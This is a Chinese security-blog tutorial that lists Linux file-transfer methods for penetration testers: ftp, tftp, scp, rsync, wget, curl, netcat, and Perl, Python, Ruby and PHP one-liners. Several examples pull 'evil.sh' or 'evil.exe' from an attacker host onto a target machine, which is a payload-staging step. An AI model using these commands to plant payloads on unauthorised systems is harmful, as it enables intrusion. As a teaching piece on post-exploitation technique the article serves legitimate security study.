> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/axR6KdEtWl7XMeY90YzZPg)

免责声明

  

  

**本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**

**只供对已授权的目标使用测试，对未授权目标的测试作者不承担责任，均由使用本人自行承担。**

![](https://mmbiz.qpic.cn/mmbiz_png/0x3kGZxwKTkyY7BrNkUwicjIkq3F2xlCIgGz7pBpnEMh3rvpbyH2DE2kIKVste0B2yP8TiavoOsuo9sMQKSj9uxQ/640?wx_fmt=png)

文章正文

  

  

Linux
-----

### ftp

ftp 在 linux 一般都自带，我们可以在终端输入 ftp 进行交互，所以我们可以在本地搭建 FTP 服务，之后在目标主机上通过终端下的 ftp 进行远程连接来下载文件

可以使用 python3 的 **pyftpdlib** 模块来搭建 ftp:

安装

```
pip install pyftpdlib
```

启动

```
python -m pyftpdlib -p 2121
```

至此一个简单的 FTP 服务器已经搭建完成，访问 `ftp://127.0.0.1:2121` 即可

（默认 IP 为 `127.0.0.1` 、端口为 `2121` ）

可选参数:

```
-i 指定IP地址（默认为本机的IP地址）-p 指定端口（默认为2121）-w 写权限（默认为只读）-d 指定目录 （默认为当前目录）-u 指定用户名登录-P 设置登录密码
```

也可以使用 IPOP 启动一个简易的 FTP 服务：

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubjVXO2QVicEtHJzDDzl0EuYI469phsiaaA7KZGHUHsGEvJE7S5LjXQXA2FJBI8nDr0qdvu4Fu00T2g/640?wx_fmt=png)

之后在目标主机上远程下载 evil.exe 文件：

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubjVXO2QVicEtHJzDDzl0EuY6HiajwAXn8zlRnat6vbEuxNibicVFlYj9qrlVAJYiaPOnWMMBOo294C6zg/640?wx_fmt=png)

### tftp

使用下面的命令将服务器本地文件上传到远程主机：

(从服务器下载远程主机的文件也类似，不再演示)

第一步，远程主机运行 TFTP 服务

```
apt-get install atftpd  //安装tftp服务程序mkdir /tmp/backup  //创建目录chmod 777 /tmp/backup  //修改权限sudo atftpd --daemon --port 69 /tmp/backup  //启动服务程序
```

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubjVXO2QVicEtHJzDDzl0EuYDT7yjaGA0FEibbxdcIzFsjpg8zClwlrXWFFTf3e2ibq6d4iaYpEGqXGMQ/640?wx_fmt=png)

第二步，Linux 服务器创建测试文件并使用 tftp 将文件上传到远程主机

```
echo "sent by tftp." > tftp.senttftp 192.168.43.237put tftp.sent tftp.get
```

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubjVXO2QVicEtHJzDDzl0EuYtoY2ys1qiaOV3oXNYUD91uwEluyicAYf5bIfJ2KbMJTB7DCBc1pR4vCA/640?wx_fmt=png)

第三步，远程主机查看接收到的文件

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubjVXO2QVicEtHJzDDzl0EuYB1EOPLias7R4YkohdtIFxMpHUmp40kkdaMYgUbNqiaSlT71DoHmWhiaMw/640?wx_fmt=png)

### sftp

sftp 是 Secure File Transfer Protocol 的缩写，安全文件传送协议。可以为传输文件提供一种安全的网络的加密方法。sftp 与 ftp 有着几乎一样的语法和功能。SFTP 为 SSH 的其中一部分。

用法：

运行 SSH 服务

```
systemctl start sshd
```

连接远程服务器：

```
sftp username@ip
```

回车之后输入服务器密码即可连接成功。

将文件上传到服务器上：

```
put [本地文件的地址] [服务器上文件存储的位置]
```

将服务器上的文件下载到本地：

```
get [服务器上文件存储的位置] [本地要存储的位置]
```

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubjVXO2QVicEtHJzDDzl0EuYSLVlAys5K4bUrbdg0aDzJTM7eibIbXIasbRVGibrkibqhSIjAhtCwyk0A/640?wx_fmt=png)

### scp

scp 是 secure copy 的简写，用于在 **Linux 下**进行远程拷贝文件 / 目录的命令。

和它类似的命令有 cp，不过 cp 只是在本机进行拷贝不能跨服务器，而且 scp 传输是加密的。可能会稍微影响一下速度。当你服务器硬盘变为只读 read only system 时，用 scp 可以帮你把文件移出来。

另外，scp 还非常不占资源，不会提高多少系统负荷，在这一点上，rsync 就远远不及它了。虽然 rsync 比 scp 会快一点，但当小文件众多的情况下，rsync 会导致硬盘 I/O 非常高，而 scp 基本不影响系统正常使用。scp 在跨机器复制的时候为了提高数据的安全性，使用了 ssh 连接和加密方式，如果机器之间配置了 ssh 免密码登录，那在使用 scp 的时候密码都不用输入。

安装：

```
yum install -y openssh-clients
```

使用：

从本地复制到远程

```
# 拷贝文件scp /home/test/test.txt root@192.168.0.2:/home/test/# 拷贝目录scp -r /home/test/ root@192.168.0.2:/home/test/
```

从远程复制到本地

```
# 拷贝文件scp root@192.168.0.2:/home/test/test.txt /home/test/# 拷贝目录scp -r root@192.168.0.2:/home/test/ v/home/test/
```

### rsync

rsync（remote synchronize）是一个远程数据同步工具，可通过 LAN/WAN 快速同步多台主机之间的文件。也可以使用 rsync 同步本地硬盘中的不同目录。

rsync 具有如下的基本特性：

```
可以镜像保存整个目录树和文件系统可以很容易做到保持原来文件的权限、时间、软硬链接等无须特殊权限即可安装优化的流程，文件传输效率高可以使用 rsh、ssh 方式来传输文件，当然也可以通过直接的 socket 连接支持匿名传输，以方便进行网站镜象
```

在使用 rsync 进行远程同步时，可以使用两种方式：远程 Shell 方式（建议使用 ssh，用户验证由 ssh 负责）和 C/S 方式（即客户连接远程 rsync 服务器，用户验证由 rsync 服务器负责）。  
无论本地同步目录还是远程同步数据，首次运行时将会把全部文件拷贝一次，以后再运行时将只拷贝有变化的文件（对于新文件）或文件的变化部分（对于原有文件）。

rsync 的命令格式为：

```
1）本地使用：rsync [OPTION...] SRC... [DEST]2）通过远程 Shell 使用：拉: rsync [OPTION...] [USER@]HOST:SRC... [DEST]推: rsync [OPTION...] SRC... [USER@]HOST:DEST3）访问 rsync 服务器:拉: rsync [OPTION...] [USER@]HOST::SRC... [DEST]推: rsync [OPTION...] SRC... [USER@]HOST::DEST拉: rsync [OPTION...] rsync://[USER@]HOST[:PORT]/SRC... [DEST]推: rsync [OPTION...] SRC... rsync://[USER@]HOST[:PORT]/DEST
```

例子，使用下面的命令将服务器本地文件上传到远程主机：

```
echo "sent by rsync." > rsync.sent
```

```
rsync -v -u -a -stat rsync.sent user1@192.168.43.237:/home/user1/rsync.get
```

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubjVXO2QVicEtHJzDDzl0EuY4BwRNB1oE0qjvrt7UGiacL5st4IibHyr0cxdbDCc1GY6KKJEicxsicZibKg/640?wx_fmt=png)

远程主机查看接收到的文件

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubjVXO2QVicEtHJzDDzl0EuYVTlUaPsiaroib5X2cmCGgNe6ib8reTG9nyDIf0rPOicHG7iaCZ3GMXiciaCOA/640?wx_fmt=png)

### rz、sz（lrzsz）

rz sz 指令可以实现 linux 和 windows 之间的文件传输，但要求在 windows 客户端要安装 Xshell 或 SecureCRT 远程连接工具。

rz 指令和 sz 指令是一对上传与下载的指令。它们的软件包名为 lrzsz。

*   rz ： 用于 linux 与 windows 之间的文件上传
    
*   sz ： 用于 linux 与 windows 之间的文件下载
    

工具的安装:　

```
yum install lrzsz -y
```

rz sz 指令使用很简单，执行 rz 指令，远程连接工具会弹出 windows 文件选择窗口，只要选择要上传的文件即可

文件上传：

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubjVXO2QVicEtHJzDDzl0EuYbM8vBziaDEMBEKwb74UND8VFWw7N6F8RuBLJRRaBCdL1KOTKJmxoBfA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubjVXO2QVicEtHJzDDzl0EuYQNhdibAz5IGtaGMubiaib6Ob0FCog0SS5VKnichBRXceLM77Fibhbfz6bfA/640?wx_fmt=png)

文件下载：

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubjVXO2QVicEtHJzDDzl0EuY8txMH0cVzFMOQGCYe1jZ0Pw7blzNhWAUkMaZRRlozoBicGtUVUgxq4w/640?wx_fmt=png)

### wget

wget 是一个从网络上自动下载文件的自由工具，支持通过 HTTP、HTTPS、FTP 三个最常见的 TCP/IP 协议下载，并可以使用 HTTP 代理。"wget" 这个名称来源于 “World Wide Web” 与 “get” 的结合。当目标主机上有安装 wget 时，我们可以直接通过该应用程序来实现远程文件下载：

```
wget http://192.168.174.1:1234/evil.sh
```

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubjVXO2QVicEtHJzDDzl0EuYhKqlJnlsUa9p9HZsdHamLJWmYQcia2yQP9NU24iaNbLrrSgozia67REicw/640?wx_fmt=png)

### cURL

cURL 是一个利用 URL 语法在命令行下工作的文件传输工具，1997 年首次发行，它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称 cURL 为下载工具，cURL 还包含了用于程序开发的 libcurl，当目标主机中安装了 curl 时我们可以通过以下方式来实现远程下载文件到本地：

```
curl http://192.168.174.1:1234/evil.sh -o evil.sh
```

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubjVXO2QVicEtHJzDDzl0EuYicxicRm0xp0IAxnZW7BScqicIqUT0JRsFIEDClcr1ehJMiclkY3ct0OyVQ/640?wx_fmt=png)

### netcat

首先，我们在本地使用 nc 起一个监听，并传递我们想要传输的文件名称：

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubjVXO2QVicEtHJzDDzl0EuYiaLcicKk4UIaGaDUxKndGIfBgnQUuZ6xRRluryXS3BfCuJ8MxrwA8OWA/640?wx_fmt=png)

之后在目标主机上下载文件：

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubjVXO2QVicEtHJzDDzl0EuYVibw69g74EktB5iaRUNWHVUKicj3TRj86yJUuTEEkMw5nK72HL08cAaTg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubjVXO2QVicEtHJzDDzl0EuYIKPvWomwyVVzJPdfSiczRTEqSv2gYzoWF02puaUhKsnC4EGctOKj6Yw/640?wx_fmt=png)

### Perl

Perl 是目前很受欢迎的主流脚本语言，linux 主机一般都自带 perl 环境，我们可以在终端中使用 vim 来编辑一个 perl 脚本，之后执行 perl 来实现远程文件下载：

```
#!perl#!/usr/bin/perluse LWP::Simple;getstore("http://192.168.174.1:1234/evil.sh","evil.sh");
```

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubjVXO2QVicEtHJzDDzl0EuYoOznYdBe5Q70QL5j5PyHE42vNDc17xjKWdY9ugMn2xjib4ibSMJXBaVg/640?wx_fmt=png)

之后在终端运行该 perl 文件即可：

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubjVXO2QVicEtHJzDDzl0EuYZDbZczGopv10JtibYDJcN1bMOcoY71BQldWqJnn6pU3e98xBr9Esfcw/640?wx_fmt=png)

### python

Python 是目前很受欢迎的主流脚本语言，当目标主机内安装了 python 时，我们可以在 shell 中使用 python 来实现远程文件下载：

```
Type "help", "copyright", "credits" or "license" for more information.>>> import urllib2>>> u = urllib2.urlopen('http://192.168.174.1:1234/evil.sh')>>> localfile = open('local_file.sh','w')>>> localfile.write(u.read())>>> localfile.close()>>>
```

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubjVXO2QVicEtHJzDDzl0EuY0dOrP4iaWHic2ZrYDF5Sn4bicyauvmT0J03KhziajBgnwqvHzlEO9bQSGQ/640?wx_fmt=png)

### Ruby

当目标主机内安装了 Ruby 时，我们可以在终端使用 vim 来编辑一个 Ruby 脚本，之后执行 Ruby 来实现远程文件下载：

```
#!ruby#!/usr/bin/rubyrequire 'net/http'Net::HTTP.start("192.168.174.1") { |http|r = http.get("/evil.sh")open("save_location.sh", "wb") { |file|file.write(r.body)}}
```

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubjVXO2QVicEtHJzDDzl0EuYQ86aicdO1ECkLBJ05pz2nQunzavd0ZeeMYPHmnyqZLLzKl6IxV2wIcQ/640?wx_fmt=png)

成功下载文件到本地

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubjVXO2QVicEtHJzDDzl0EuYiaLDLfcojXUDGjpSiahYTPVc9iczx5yEn0qYbz61WIfAib7owNwJjb3TWg/640?wx_fmt=png)

### PHP

当目标主机内安装了 PHP 时，我们可以在终端使用 vim 来编辑一个 PHP 脚本，之后执行 PHP 来实现远程文件下载：

```
<?php $data = @file("http://example.com/file.sh");        $lf = "local_file.sh";        $fh = fopen($lf, 'w');        fwrite($fh, $data[0]);        fclose($fh);?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubjVXO2QVicEtHJzDDzl0EuYRIkCSnTbE6iconDUEzgJMbb26pnkvwQVl5voPXt8f2ygR0ZqSMZEnOQ/640?wx_fmt=png)

成功下载远程文件到本地

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKubjVXO2QVicEtHJzDDzl0EuYCgZKvqoTDEQJicek1MGpj9ul7Y9vwpvO8eR8yib6998FiaEuZASujicBYw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0x3kGZxwKTkyY7BrNkUwicjIkq3F2xlCIgGz7pBpnEMh3rvpbyH2DE2kIKVste0B2yP8TiavoOsuo9sMQKSj9uxQ/640?wx_fmt=png)

技术交流

  

  

  

  

交流群

  

  

关注公众号回复 “**加群**”，添加 Z2OBot 小 K 自动拉你加入 **Z2O 安全攻防交流群**分享更多好东西。

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuY9E2LvIlswNljP9IyicCzPZxkOfzs2Dtuex992CbtUiabzNmISZ4m55KFcNAs6DaibVTCzMiatIQ1m5Q/640?wx_fmt=png)

  

  

知识星球

  

  

**星球不定时更新最新漏洞复现，手把手教你，同时不定时更新 POC、内外网渗透测试骚操作。****涉及方向包括 Web 渗透、免杀绕过、内网攻防、代码审计、应急响应、云安全等**

![](https://mmbiz.qpic.cn/mmbiz_jpg/h8P1KUHOKubjVXO2QVicEtHJzDDzl0EuY7WCibgib7IWAkx4fpYSAibSRBkDQI0ian07gYbZSPO89P9nAX0cuCuQXQw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuZfu1t4CEIpPKUY9VPRpSZdvgz3NjJZAkeQIb8SlHDt5zhQHIyIdZIqopqpqVkgoM7hvcYjAVoDUA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuY9E2LvIlswNljP9IyicCzPZhzFSxAGdqk9qknfRWgJMslJ6sWVlO0AZ9vxQenScKMAZ8icODWJBOyg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuZfu1t4CEIpPKUY9VPRpSZdOh2m6b0IxhwH6V2AdVKMjBMSJ2t3ZPGVjULPy4vHfNtjFH8VZQ00qA/640?wx_fmt=png)

  

公众号

  

  

**欢迎关注：**

往期文章：

  

  

[**CVE-2022-30190 Follina Office RCE 分析【附自定义 word 模板 POC】**](http://mp.weixin.qq.com/s?__biz=Mzg2ODYxMzY3OQ==&mid=2247487751&idx=1&sn=b42b637157f9cf21cd62299346baf3f5&chksm=cea8fa47f9df735156337fa5b34b71ec11dbd6d8e96eb2684dc241c0a7ccfae0a4cec90d63a2&scene=21#wechat_redirect)  

[**邮箱附件钓鱼常用技法**](http://mp.weixin.qq.com/s?__biz=Mzg2ODYxMzY3OQ==&mid=2247487390&idx=1&sn=b99a7f0eb43e38222a9ff0fa3eb0ded4&chksm=cea8e4def9df6dc8d95a29f7b2daceb84e2e6bb2529596c519d10eaaf157a51d10ba1829235a&scene=21#wechat_redirect)

[**入侵痕迹清理**](http://mp.weixin.qq.com/s?__biz=Mzg2ODYxMzY3OQ==&mid=2247487424&idx=1&sn=5aa705aa06bca902f0ab27190b423d4e&chksm=cea8e480f9df6d96a827ee66e6b6ef7b8d04c1767a8bb6c73eb5ad18cdf9c383952d2163534c&scene=21#wechat_redirect)

[**一篇文章带你学会容器逃逸**](http://mp.weixin.qq.com/s?__biz=Mzg2ODYxMzY3OQ==&mid=2247486670&idx=1&sn=6822dd40dcc20121fce0c42188fcd49a&chksm=cea8e78ef9df6e987896bdbd6b7a96c48992782657680574d7015d72984e7ca67a25a0aeea5d&scene=21#wechat_redirect)

[**spring cloud function spel 表达式注入 RCE 复现**](http://mp.weixin.qq.com/s?__biz=Mzg2ODYxMzY3OQ==&mid=2247486607&idx=1&sn=659ee01cb0fe59d034080efc32a7348b&chksm=cea8e7cff9df6ed96a64bc0c6d2890c28a9df8f776062f53f67ceea0e88efb5bca3147f1c78b&scene=21#wechat_redirect)  
[**利用 burp 精准定位攻击者**](http://mp.weixin.qq.com/s?__biz=Mzg2ODYxMzY3OQ==&mid=2247486527&idx=1&sn=5891b6ef97724eec50464c72dd9c48e0&chksm=cea8e77ff9df6e69979bb2a3485852d5d3c8e11c77dd0eaba91367b203256fa587c33eff7fa8&scene=21#wechat_redirect)  
[**从此 Typora 代码块有了颜色**](http://mp.weixin.qq.com/s?__biz=Mzg2ODYxMzY3OQ==&mid=2247486501&idx=1&sn=73946992c1ddf5111dcf61b7afbc733f&chksm=cea8e765f9df6e73794e277e11f7d319ac4f18fbf7f7cc06f562428d2d653bf02dd11ba59340&scene=21#wechat_redirect)  
[**不会写免杀也能轻松过 defender 上线 CS**](http://mp.weixin.qq.com/s?__biz=Mzg2ODYxMzY3OQ==&mid=2247486248&idx=1&sn=2a02490ec5574225715615f7b0baa28f&chksm=cea8e068f9df697e3e29aa0dd9417e4e2a7d12aa64bb403a4f014a85cd63384bd5d81a6201ab&scene=21#wechat_redirect)